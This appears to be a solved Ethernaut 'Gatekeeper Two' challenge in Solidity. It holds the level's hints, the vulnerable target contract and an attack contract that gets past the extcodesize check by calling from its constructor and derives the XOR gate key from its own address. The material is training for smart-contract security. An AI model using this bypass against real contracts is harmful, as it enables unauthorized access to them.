pragma solidity ^0.6.4;
/* 
Gatekeeper Two
Level completed!
Difficulty 6/10

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Things that might help:
Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.
Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit or via email and use it to register with the contract at gatekeepertwo.thecyber.eth (be aware that only the first 128 entrants will be accepted by the contract).


 */


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperTwoAttack {
    constructor(address _addr) public {
        bytes8 key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1) );
        _addr.call(abi.encodeWithSignature('enter(bytes8)', key));
    }
}
